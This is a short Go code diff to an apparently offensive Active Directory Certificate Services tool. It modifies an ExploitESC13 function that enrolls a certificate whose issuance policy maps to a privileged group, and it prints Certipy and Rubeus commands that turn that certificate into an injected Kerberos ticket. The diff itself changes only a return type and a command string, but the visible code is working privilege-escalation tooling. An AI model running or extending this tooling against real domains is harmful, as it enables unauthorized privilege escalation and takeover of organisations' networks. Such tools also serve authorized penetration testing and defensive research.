@@ -1,7 +1,7 @@
 package pki
 
 import (
-	"crypto/ecdsa"
+	"crypto"
 	"crypto/x509"
 	"fmt"
 	"strings"
@@ -173,7 +173,7 @@ func ScanESC13(cfg *ADCSConfig) ([]ESC13Finding, error) {
 // This reuses the standard certificate enrollment pattern from ExploitESC1 —
 // the key difference is that ESC13 does not require enrollee-supplies-subject;
 // the privilege escalation comes from the OID-to-group mapping, not SAN control.
-func ExploitESC13(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
+func ExploitESC13(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
 	fmt.Printf("[!] ESC13 Exploitation: template=%s target=%s\n", templateName, targetUPN)
 
 	// Step 1: Verify the template is ESC13-exploitable
@@ -215,7 +215,7 @@ func ExploitESC13(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certif
 	fmt.Printf("[*] The issued certificate's issuance policy OID (%s) maps to group %s\n",
 		matchedFinding.IssuancePolicyOID, matchedFinding.LinkedGroupName)
 	fmt.Printf("[*] Next steps:\n")
-	fmt.Printf("    certipy auth -pfx %s.pfx -dc-ip %s\n", upnUser, cfg.TargetDC)
+	fmt.Printf("    certipy-ad auth -pfx %s.pfx -dc-ip <DC_IP> -domain %s\n", upnUser, cfg.Domain)
 	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s.pfx /ptt\n", targetUPN, upnUser)
 	fmt.Printf("    # The TGT will include group membership for: %s\n", matchedFinding.LinkedGroupName)
 	return cert, certKey, nil
